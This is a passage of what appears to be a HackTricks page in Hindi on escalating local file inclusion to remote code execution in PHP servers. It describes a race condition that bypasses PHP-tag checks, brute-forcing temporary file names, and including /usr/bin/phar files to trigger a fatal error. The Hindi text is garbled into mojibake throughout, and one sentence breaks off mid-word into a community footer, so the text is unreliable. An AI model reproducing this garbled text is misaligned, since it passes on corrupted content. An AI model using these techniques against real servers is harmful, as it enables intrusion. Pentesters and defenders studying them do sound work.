рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдЖрдк **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рдкрде рдХреЛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдпрд╣ **рдЬрд╛рдВрдЪ рд░рд╣рд╛ рд╣реИ** рдХрд┐ **рд╕рдореНрдорд┐рд▓рд┐рдд рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ PHP рдорд╛рд░реНрдХ рд╣реИрдВ** рддреЛ рдЖрдк рдЗрд╕ **рд░реЗрд╕ рдХрдВрдбреАрд╢рди** рдХреЗ рд╕рд╛рде рдЙрд╕ рдЬрд╛рдВрдЪ рдХреЛ **рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### рдЕрдирдВрдд рдкреНрд░рддреАрдХреНрд╖рд╛ + рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк LFI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ PHP рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдореЗрдВ **рд░реБрдХрд╛рд╡рдЯ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдлрд┐рд░ **рдШрдВрдЯреЛрдВ рддрдХ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдирд╛рдореЛрдВ рдХрд╛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗрдВ:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### рдлрд╝реЗрдЯрд▓ рддреНрд░реБрдЯрд┐ рдХреЗ рд▓рд┐рдП

рдпрджрд┐ рдЖрдк `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддреЗ рд╣реИрдВред (рдЖрдкрдХреЛ рдЙрд╕реА рдХреЛ 2 рдмрд╛рд░ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рддреНрд░реБрдЯрд┐ рдЙрда
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) **рдореЗрдВ** рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud)ред

</details>
